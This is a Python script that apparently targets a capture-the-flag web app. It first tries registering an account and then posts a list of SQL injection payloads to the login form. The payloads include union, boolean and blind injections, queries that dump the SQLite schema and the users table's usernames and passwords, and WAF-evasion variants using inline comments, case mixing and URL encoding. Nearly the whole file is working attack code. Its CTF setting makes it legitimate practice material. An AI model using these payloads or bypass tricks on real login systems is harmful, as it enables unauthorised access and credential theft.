#!/usr/bin/env python3
"""
Advanced SQL injection testing with WAF bypass techniques
"""

import requests
import time
from urllib.parse import urljoin

def test_advanced_sqli(base_url):
    """Test advanced SQL injection with WAF bypass"""
    login_url = urljoin(base_url, "/login")
    
    # Advanced payloads to bypass WAF
    payloads = [
        # Union-based
        {"username": "admin' UNION SELECT 1,2,3--", "password": "anything"},
        {"username": "admin' UNION SELECT null,null,null--", "password": "anything"},
        {"username": "admin'/**/UNION/**/SELECT/**/1,2,3--", "password": "anything"},
        
        # Boolean-based
        {"username": "admin' AND 1=1--", "password": "anything"},
        {"username": "admin' AND 1=2--", "password": "anything"},
        
        # Time-based
        {"username": "admin' AND (SELECT COUNT(*) FROM sqlite_master)>0--", "password": "anything"},
        
        # Bypass filters
        {"username": "admin'||'1'='1'--", "password": "anything"},
        {"username": "admin'+'1'='1'--", "password": "anything"},
        {"username": "admin' AnD '1'='1'--", "password": "anything"},
        {"username": "admin' %26%26 '1'='1'--", "password": "anything"},
        
        # SQLite specific
        {"username": "admin' AND sqlite_version()--", "password": "anything"},
        {"username": "admin' UNION SELECT sql FROM sqlite_master--", "password": "anything"},
        {"username": "admin' UNION SELECT name FROM sqlite_master WHERE type='table'--", "password": "anything"},
        
        # Try to extract data
        {"username": "admin' UNION SELECT username,password,1 FROM users--", "password": "anything"},
        {"username": "admin' UNION SELECT * FROM users--", "password": "anything"},
        
        # Blind injection
        {"username": "admin' AND (SELECT COUNT(*) FROM users)>0--", "password": "anything"},
        {"username": "admin' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>5--", "password": "anything"},
        
        # Try different quote styles
        {"username": 'admin" OR "1"="1"--', "password": "anything"},
        {"username": 'admin` OR `1`=`1`--', "password": "anything"},
        
        # Encoding bypasses
        {"username": "admin%27%20OR%20%271%27=%271%27--", "password": "anything"},
        {"username": "admin\' OR \'1\'=\'1\'--", "password": "anything"},
    ]
    
    print("Testing advanced SQL injection payloads...")
    
    for i, payload in enumerate(payloads):
        try:
            response = requests.post(login_url, data=payload, timeout=10, allow_redirects=False)
            print(f"Payload {i+1}: {payload['username']}")
            print(f"  Status: {response.status_code}")
            
            if response.status_code == 302:
                location = response.headers.get('Location', 'Unknown')
                print(f"  Redirect to: {location}")
                
                # If redirected to dashboard, we might have succeeded
                if 'dashboard' in location:
                    print("  *** SUCCESSFUL LOGIN! ***")
                    # Follow the redirect to get the flag
                    dashboard_response = requests.get(urljoin(base_url, location), cookies=response.cookies)
                    print(f"  Dashboard content: {dashboard_response.text[:500]}")
                    
                    if "hw{" in dashboard_response.text.lower():
                        print("  *** FLAG FOUND IN DASHBOARD ***")
                        return dashboard_response.text
            
            if "flag" in response.text.lower() or "hw{" in response.text.lower():
                print(f"  *** POTENTIAL FLAG FOUND ***")
                print(f"  Response: {response.text[:500]}")
                return response.text
            
            # Check for different error patterns
            if "syntax error" in response.text:
                print("  SQL syntax error detected")
            elif "blocked" in response.text.lower():
                print("  Request blocked by WAF")
            elif response.status_code == 500:
                print("  Internal server error")
            elif len(response.text) > 1000:  # Might be a successful response
                print(f"  Large response ({len(response.text)} chars)")
            
            print()
            
        except requests.exceptions.RequestException as e:
            print(f"  Error: {e}")
        
        time.sleep(0.1)  # Be nice to the server

def try_register_and_login(base_url):
    """Try to register a new account and login"""
    register_url = urljoin(base_url, "/register")
    login_url = urljoin(base_url, "/login")
    
    # Try to register
    register_data = {
        "username": "testuser123",
        "password": "testpass123",
        "display_name": "Test User"
    }
    
    print("Trying to register a new account...")
    try:
        response = requests.post(register_url, data=register_data, timeout=10)
        print(f"Register response: {response.status_code}")
        print(f"Response: {response.text[:300]}")
        
        if response.status_code == 200 or "success" in response.text.lower():
            print("Registration might have succeeded, trying to login...")
            
            login_response = requests.post(login_url, data={
                "username": "testuser123",
                "password": "testpass123"
            }, allow_redirects=True)
            
            print(f"Login response: {login_response.status_code}")
            if "dashboard" in login_response.url or "flag" in login_response.text.lower():
                print("*** LOGIN SUCCESSFUL ***")
                print(f"Response: {login_response.text}")
                return login_response.text
                
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

def main():
    base_url = "https://admin-panel-ctf.onrender.com"
    
    print("=== Advanced SQL Injection Testing ===")
    
    # Try registration first
    result = try_register_and_login(base_url)
    if result and "hw{" in result.lower():
        print("Flag found via registration!")
        return
    
    # Try advanced SQL injection
    result = test_advanced_sqli(base_url)
    if result and "hw{" in result.lower():
        print("Flag found via SQL injection!")

if __name__ == "__main__":
    main()